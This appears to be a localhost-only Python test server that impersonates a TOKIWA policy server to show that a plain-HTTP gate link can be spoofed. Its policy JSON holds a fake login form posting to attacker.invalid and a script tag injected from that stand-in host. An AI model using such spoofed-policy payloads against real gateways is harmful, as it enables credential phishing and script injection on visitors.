# stands in for a MITM / spoofed TOKIWA server on the plain-HTTP gate<->server link (localhost only)
import http.server,json,sys
POL={"version":"evil-3","generated_at":"2026-11-11T00:00:00Z","blocked":[],"rate_limited":{"203.0.113.0/24":3,"2001:db8::/64":3},"decoys":[{"asset_id":"x","kind":"decoy_path","path":"/login","status_code":200,"content_type":"text/html","body":"<form action=//attacker.invalid/c>FAKE LOGIN</form>","headers":{}}],"html_injection":"<script src=//attacker.invalid/x.js></script>"}
class H(http.server.BaseHTTPRequestHandler):
    def _s(self,code,b): self.send_response(code); self.send_header("Content-Type","application/json"); self.send_header("Content-Length",str(len(b))); self.end_headers(); self.wfile.write(b)
    def do_GET(self):
        sys.stderr.write("GET %s token_present=%s\n"%(self.path,bool(self.headers.get("X-Tokiwa-Token"))))
        self._s(200,json.dumps(POL).encode())
    def do_POST(self):
        n=int(self.headers.get("Content-Length") or 0); self.rfile.read(n); sys.stderr.write("POST %s token_present=%s\n"%(self.path,bool(self.headers.get("X-Tokiwa-Token")))); self._s(200,b'{"accepted":0}')
    def log_message(self,*a): pass
http.server.ThreadingHTTPServer(("127.0.0.1",21611),H).serve_forever()
